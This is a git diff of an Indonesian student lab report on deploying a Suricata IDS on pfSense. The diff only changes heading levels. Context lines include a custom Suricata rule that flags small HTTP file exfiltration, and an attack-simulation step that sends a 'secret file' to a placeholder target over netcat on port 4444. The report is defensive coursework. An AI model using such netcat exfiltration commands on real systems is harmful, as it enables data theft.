@@ -9,17 +9,17 @@
 | 4  | Zahra Hafizhah                              | 5027241121  |
 
 
-### Topologi
+## Topologi
 
 ![topologi](images/topologi.png)
 
-### Posisi IDS dan Alasan
+## Posisi IDS dan Alasan
 IDS dipasang di pfSense dengan beberapa alasan :
 1. Semua trafik lintas subnet lewat pfSense
 2. Tidak perlu memasang IDS di setiap subnet (hemat resource)
 3. Bisa menangkap Nmap SYN scan, SSH brute force, HTTP file transfer
 
-### Konfigurasi
+## Konfigurasi
 IDS ditempatkan pada pdSense1, memanfaatkan kemampuan inline untuk memantau lalu lintas pada titik kritis jaringan
 |Interface | IP Address            | Keterangan Jaringan             | 
 |----------|-----------------------|---------------------------------|
@@ -34,7 +34,7 @@ Variabel lingkungan didefinisikan untuk membedakan secara jelas antara jaringan 
 | EXTERNAL_NET   | !$HOME_NET (atau any jika diimplementasi sebagai interface WAN)                                | 
 | $DNS\_SERVERS$ | Diset ke IP DNS Internal/Eksternal yang digunakan (misalnya 8.8.8.8, 1.1.1.1 atau IP internal) | 
 
-### Custome Rules
+## Custome Rules
 a. Rule Port Scanning
 Subnet Mahasiswa = 10.20.10.0/24
 Target = Subnet Riset 10.20.30.0/24
@@ -55,7 +55,7 @@ RULE
 alert http 10.20.30.10 any -> 10.20.10.0/24 any (msg:"[IDS] Suspicious Small HTTP File Exfiltration"; file_data; content:"HTTP/1.1 200"; http_header; dsize:<2000; sid:100003; rev:1;)
 ```
 
-### Simulasi Serangan
+## Simulasi Serangan
 a. SYN Scan
 Dari PC Mahasiswa
 ```
@@ -85,7 +85,7 @@ Sender:
 nc <IP_TARGET> 4444 < file_rahasia.txt
 ```
 Suricata menampilkan alert terkait transfer data dalam jumlah besar, menunjukkan bahwa IDS mampu mengidentifikasi pola exfiltration sederhana melalui kanal TCP biasa.
-### Analisis Singkat
+## Analisis Singkat
 
 **Serangan Yang Paling Mudah Terdeteksi**
 
@@ -114,6 +114,6 @@ Agar analisis lebih mudah dan korelasi antar alert lebih jelas.
 Mengaktifkan multithreading dan memaksimalkan CPU cores supaya IDS tidak drop packet ketika trafik tinggi.
 
 
-### Kesimpulan
+## Kesimpulan
 
 Berdasarkan pengujian yang dilakukan, Suricata berhasil mendeteksi seluruh jenis serangan yang disimulasikan, yaitu port scanning, brute force SSH, dan exfiltration traffic. Rule bawaan Suricata mampu mendeteksi scan dengan sangat cepat, sementara custom rules membantu memperjelas pola brute force dan transfer data mencurigakan. Meskipun terdapat beberapa potensi false positive, secara keseluruhan IDS berjalan efektif dan memberikan alert yang akurat. Dengan tuning rule dan threshold yang lebih baik, sistem dapat menjadi lebih presisi dan optimal untuk digunakan sebagai IDS dalam lingkungan jaringan.
